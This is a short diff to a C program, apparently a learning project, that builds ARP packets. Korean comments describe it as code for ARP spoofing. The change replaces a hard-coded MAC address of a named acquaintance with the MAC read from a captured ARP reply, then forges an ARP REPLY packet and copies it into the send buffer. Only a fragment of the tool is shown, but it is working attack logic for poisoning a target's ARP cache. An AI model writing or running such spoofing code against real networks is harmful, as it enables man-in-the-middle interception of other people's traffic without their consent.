@@ -205,6 +205,30 @@ int main(int argc, char* argv[]){
     printf("\n");
     if(eth[2][0]==0x08 && eth[2][1]==0x06 && packet2[26] == arp_pk.TARGET_IP[0] && packet2[27] == arp_pk.TARGET_IP[1] && packet2[28] == arp_pk.TARGET_IP[2] && packet2[29] == arp_pk.TARGET_IP[3] ){
     	printf("FIND!!!!!!");
+
+
+
+
+	  	// 새로운 ARP 스푸핑 위하여
+			arp_pk.DES_MAC[0] = packet2[6];
+		arp_pk.TARGET_MAC[0] = packet2[6];
+			arp_pk.DES_MAC[1] = packet2[7];
+		arp_pk.TARGET_MAC[1] = packet2[7];
+			arp_pk.DES_MAC[2] = packet2[8];
+		arp_pk.TARGET_MAC[2] = packet2[8];
+			arp_pk.DES_MAC[3] = packet2[9];
+		arp_pk.TARGET_MAC[3] = packet2[9];
+			arp_pk.DES_MAC[4] = packet2[10];
+		arp_pk.TARGET_MAC[4] = packet2[10];
+			arp_pk.DES_MAC[5] = packet2[11];
+		arp_pk.TARGET_MAC[5] = packet2[11];
+
+		arp_pk.OP = htons(OP_TYPE_REPLY);
+		
+		memcpy(packet, &arp_pk, sizeof(arp_pk));
+		//	
+
+
     	break;
     } // 이거랑 src ip 가 같으면 break
 
@@ -212,26 +236,6 @@ int main(int argc, char* argv[]){
   }
 
 
-
-  	// 새로운 ARP 스푸핑 갈기기~~
-	// 민석이 아이피 일단 가져다가 박음
-		arp_pk.DES_MAC[0] = '\x80';
-	arp_pk.TARGET_MAC[0] = '\x80';
-		arp_pk.DES_MAC[1] = '\xe6';
-	arp_pk.TARGET_MAC[1] = '\xe6';
-		arp_pk.DES_MAC[2] = '\x50';
-	arp_pk.TARGET_MAC[2] = '\x50';
-		arp_pk.DES_MAC[3] = '\x0f';
-	arp_pk.TARGET_MAC[3] = '\x0f';
-		arp_pk.DES_MAC[4] = '\x2d';
-	arp_pk.TARGET_MAC[4] = '\x2d';
-		arp_pk.DES_MAC[5] = '\x72';
-	arp_pk.TARGET_MAC[5] = '\x72';
-
-	arp_pk.OP = htons(OP_TYPE_REPLY);
-	
-	memcpy(packet, &arp_pk, sizeof(arp_pk));
-	//
 
 
 
